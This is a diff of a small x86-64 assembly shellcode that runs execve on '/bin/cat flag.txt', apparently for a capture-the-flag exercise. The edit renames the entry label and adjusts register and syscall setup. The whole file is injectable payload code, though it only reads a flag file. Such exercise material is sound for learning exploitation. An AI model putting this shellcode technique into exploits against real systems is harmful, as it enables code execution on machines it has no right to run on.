@@ -1,9 +1,9 @@
 ; execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
 BITS 64
     section .text
-            global _start
+            global shellcode
 
-    _start:
+    shellcode:
             xor rdx, rdx
             push rdx
             mov qword rbx, 'flag.txt'
@@ -13,14 +13,11 @@ BITS 64
             mov qword rbx, '/bin/cat'
             push rbx
             mov rdi, rsp
-            push rax
+            push rdx
             push r13
             ; sycall execve, rdx is initially zero
             push rdi
             mov rsi, rsp
-            mov al, 0x3b
-            syscall
-
-            xor rdi, rdi
-            mov al, 0x34
+            xor rax, rax
+            mov al, 59
             syscall
